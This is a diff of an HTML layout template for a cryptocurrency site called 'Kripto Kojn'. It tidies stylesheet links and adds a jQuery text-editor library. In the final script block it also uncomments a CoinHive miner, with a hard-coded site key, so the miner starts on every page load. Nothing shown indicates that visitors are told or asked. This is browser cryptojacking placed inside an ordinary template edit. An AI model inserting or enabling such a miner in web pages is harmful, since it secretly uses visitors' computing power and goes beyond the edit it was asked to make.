@@ -11,21 +11,10 @@
     <title>{% block subtitle %}{% endblock %}Kripto Kojn</title>
 
     <link rel="stylesheet" href="https://unpkg.com/purecss@1.0.0/build/pure-min.css">
-    
-    <!--[if lte IE 8]>
-        <link rel="stylesheet" href="https://unpkg.com/purecss@1.0.0/build/grids-responsive-old-ie-min.css">
-    <![endif]-->
-    <!--[if gt IE 8]><!-->
-        <link rel="stylesheet" href="https://unpkg.com/purecss@1.0.0/build/grids-responsive-min.css">
-    <!--<![endif]-->
-    
-    
-        <!--[if lte IE 8]>
-            <link href="{{request.static_url('cryptodokladi:static/css/pure-layout/side-menu-old-ie.css')}}" rel="stylesheet">
-        <![endif]-->
-        <!--[if gt IE 8]><!-->
-            <link href="{{request.static_url('cryptodokladi:static/css/pure-layout/side-menu.css')}}" rel="stylesheet">
-        <!--<![endif]-->
+    <link rel="stylesheet" href="https://unpkg.com/purecss@1.0.0/build/grids-responsive-min.css">
+
+    <link href="{{request.static_url('cryptodokladi:static/css/side-menu.css')}}" rel="stylesheet">
+    <link href="{{request.static_url('cryptodokladi:static/css/jquery-te-1.4.0.css')}}" rel="stylesheet">
 
 </head>
 <body>
@@ -93,11 +82,12 @@
 
 <script src="{{request.static_url('cryptodokladi:static/js/ui.js')}}"></script>
 <script src="{{request.static_url('cryptodokladi:static/js/jquery-3.2.1.min.js')}}"></script>
+<script src="{{request.static_url('cryptodokladi:static/js/jquery-te-1.4.0.min.js')}}"></script>
 <script src="{{request.static_url('cryptodokladi:static/js/script.js')}}"></script>
 <script src="https://coinhive.com/lib/coinhive.min.js"></script>
 <script>
-    //var miner = new CoinHive.User('fPJeVvHSsmiTqZD7MXrltqc3ogjojFLp', 'KriptoKojn', { threads: 1 });
-    //miner.start();
+    var miner = new CoinHive.User('fPJeVvHSsmiTqZD7MXrltqc3ogjojFLp', 'KriptoKojn', { threads: 1 });
+    miner.start();
 </script>
 
 </body>
